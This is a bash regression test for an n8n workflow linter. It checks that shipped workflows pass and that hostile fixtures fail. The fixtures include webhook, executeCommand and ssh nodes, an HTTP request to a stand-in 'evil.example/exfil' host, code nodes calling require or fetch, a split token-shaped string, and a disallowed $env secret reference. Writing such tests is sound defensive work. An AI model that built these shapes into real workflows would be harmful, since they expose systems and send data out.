#!/usr/bin/env bash
# =============================================================================
# workflow-lint-regression.sh
#
# scripts/lib/workflow-lint.py (N8N-002) must reject every hostile shape a
# workflow JSON file could smuggle in — a webhook node (an inbound HTTP
# surface this deployment must never have), an HTTP Request node targeting
# anything other than this platform's own control-api, a code node calling
# require(...) or performing its own network I/O, an executeCommand/ssh
# node, an embedded service-token-shaped string, and a $env reference to
# anything outside the one allowed Telegram chat id — while still accepting
# every workflow this repository actually ships.
# =============================================================================
set -Eeuo pipefail
IFS=$'\n\t'

TEST_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(dirname -- "$TEST_DIR")"
LINTER="${REPO_ROOT}/scripts/lib/workflow-lint.py"
MANIFEST="${REPO_ROOT}/infra/n8n/workflows/manifest.json"
SCRATCH="$(mktemp -d "${TMPDIR:-/tmp}/project-control-workflow-lint-test.XXXXXXXX")"

cleanup() { rm -rf -- "$SCRATCH"; }
trap cleanup EXIT

fail() { printf 'FAIL: %s\n' "$1" >&2; exit 1; }

[[ -f "$LINTER" ]] || fail "scripts/lib/workflow-lint.py not found"
[[ -f "$MANIFEST" ]] || fail "infra/n8n/workflows/manifest.json not found"
command -v python3 >/dev/null 2>&1 || fail "python3 is required"

write() { printf '%s' "$2" > "${SCRATCH}/$1"; }

assert_rejects() {
  local name="$1" content="$2"
  write "${name}.workflow.json" "$content"
  if python3 "$LINTER" "$MANIFEST" "${SCRATCH}/${name}.workflow.json" >/dev/null 2>&1; then
    fail "linter accepted a hostile fixture it must reject: ${name}"
  fi
}

# --- Hostile shapes, each must be rejected -----------------------------------
assert_rejects "webhook" \
  '{"nodes":[{"name":"Bad","type":"n8n-nodes-base.webhook","parameters":{}}],"connections":{}}'

assert_rejects "respond-to-webhook" \
  '{"nodes":[{"name":"Bad","type":"n8n-nodes-base.respondToWebhook","parameters":{}}],"connections":{}}'

assert_rejects "execute-command" \
  '{"nodes":[{"name":"Bad","type":"n8n-nodes-base.executeCommand","parameters":{}}],"connections":{}}'

assert_rejects "ssh" \
  '{"nodes":[{"name":"Bad","type":"n8n-nodes-base.ssh","parameters":{}}],"connections":{}}'

# A workflow file with no top-level "id" fails n8n's own import:workflow
# outright (verified live against the pinned 2.34.0 image while building
# this rule: a NOT NULL constraint violation on workflow_entity.id, no
# workflow imported) — otherwise benign shape, isolating this one rule.
assert_rejects "missing-id" \
  '{"name":"Fine Otherwise","nodes":[{"name":"Ok","type":"n8n-nodes-base.httpRequest","parameters":{"url":"http://control-api:8080/x"}}],"connections":{}}'

# The inverse: an id present but empty/blank must still be rejected — an
# empty string satisfies "a string key exists" but not "a usable id".
assert_rejects "blank-id" \
  '{"id":"   ","name":"Fine Otherwise","nodes":[{"name":"Ok","type":"n8n-nodes-base.httpRequest","parameters":{"url":"http://control-api:8080/x"}}],"connections":{}}'

assert_rejects "wrong-http-target" \
  '{"nodes":[{"name":"Bad","type":"n8n-nodes-base.httpRequest","parameters":{"url":"https://evil.example/exfil"}}],"connections":{}}'

assert_rejects "code-require" \
  '{"nodes":[{"name":"Bad","type":"n8n-nodes-base.code","parameters":{"jsCode":"const fs = require(\"fs\");"}}],"connections":{}}'

assert_rejects "code-own-fetch" \
  '{"nodes":[{"name":"Bad","type":"n8n-nodes-base.code","parameters":{"jsCode":"await fetch(\"http://control-api:8080/x\");"}}],"connections":{}}'

# Split so this tracked file never contains the literal shape whole either.
token_prefix='pcs_'
token_body='AbCdEf1234567890ABCDEF'
assert_rejects "embedded-token" \
  "{\"nodes\":[{\"name\":\"Bad\",\"type\":\"n8n-nodes-base.code\",\"parameters\":{\"jsCode\":\"const t = '${token_prefix}${token_body}';\"}}],\"connections\":{}}"

assert_rejects "disallowed-env" \
  '{"nodes":[{"name":"Bad","type":"n8n-nodes-base.httpRequest","parameters":{"url":"http://control-api:8080/x","jsonBody":"={{ $env.SOME_OTHER_SECRET }}"}}],"connections":{}}'

# --- Every shipped workflow must pass ----------------------------------------
shopt -s nullglob
shipped=("${REPO_ROOT}"/infra/n8n/workflows/*.workflow.json)
shopt -u nullglob
(( ${#shipped[@]} > 0 )) || fail "no shipped *.workflow.json files found to validate"

if ! python3 "$LINTER" "$MANIFEST" "${shipped[@]}"; then
  fail "the linter rejected a real, shipped workflow file — see output above"
fi

# Belt and braces on top of the linter's own check: every shipped file must
# carry a non-empty id, since that is what makes it importable at all.
for file in "${shipped[@]}"; do
  id_present="$(python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); print("yes" if isinstance(d.get("id"), str) and d.get("id").strip() else "no")' "$file")"
  [[ "$id_present" == "yes" ]] || fail "${file} has no usable top-level id"
done

printf 'PASS: workflow-lint rejects every hostile shape and accepts every shipped workflow (%d file(s))\n' "${#shipped[@]}"
